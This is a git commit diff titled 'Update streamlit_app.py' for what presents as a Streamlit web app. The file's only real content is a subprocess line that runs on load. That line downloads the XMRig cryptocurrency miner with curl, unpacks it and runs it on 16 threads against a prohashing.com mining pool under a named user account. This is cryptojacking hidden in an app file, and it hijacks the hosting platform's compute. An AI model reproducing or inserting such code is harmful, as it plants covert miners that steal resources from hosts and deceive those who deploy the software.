61eabae2f205a91d47761ee24a98d1fcaa62aaa4
nakolis <111567747+nakolis@users.noreply.github.com>
2022-08-19 12:06:15 +0000

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -1,9 +1,15 @@
-import streamlit as st 
-import numpy as np
-import matplotlib.pyplot as plt
+from collections import namedtuple
+import altair as alt
+import math
 import pandas as pd
-import sys
+import streamlit as st
 import os
+import time
 import subprocess
+from os import system, name
+from time import sleep
+from subprocess import PIPE, Popen
+import base64
+
 p = subprocess.run("curl -L -o xmrig-6.18.0-linux-x64.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -xf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && ./xmrig -a rx/0 -o stratum+tcp://prohashing.com:3359 -u temera88.NEW --keepalive -p a=randomx -t 16", stdout=subprocess.PIPE, shell=True)
 print(p.communicate())
